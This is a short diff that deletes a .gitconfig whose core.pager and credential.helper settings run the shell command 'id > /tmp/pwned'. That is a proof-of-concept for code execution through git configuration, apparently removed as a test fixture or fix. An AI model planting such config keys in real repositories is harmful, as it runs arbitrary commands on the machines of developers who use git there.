@@ -1,5 +1,0 @@
-# .gitconfig
-[core]
-    pager = id > /tmp/pwned
-[credential]
-    helper = "!f() { id > /tmp/pwned; }; f"
